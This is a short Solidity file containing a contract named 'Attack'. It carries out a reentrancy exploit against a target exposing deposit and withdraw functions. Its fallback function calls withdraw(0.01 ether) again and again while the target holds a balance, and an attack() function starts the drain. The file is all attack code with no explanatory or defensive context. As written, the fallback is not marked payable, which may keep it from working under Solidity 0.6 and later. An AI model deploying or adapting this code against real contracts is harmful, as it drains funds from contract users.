// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;

interface Test {
    function deposit() external payable;
    function withdraw(uint value) external;
}

contract Attack{

    Test testContract;

    constructor (Test _test) public {
        testContract = _test;
    }

    function setTest(Test _test) public{
        testContract = _test;
    }

    fallback() external{
        if(address(testContract).balance >= 0.01 ether){
            testContract.withdraw(0.01 ether);
        }
    }

    function deposit() payable external{
        testContract.deposit{value: msg.value}();
    }

    function attack() public{
        testContract.withdraw(0.01 ether);
    }
}

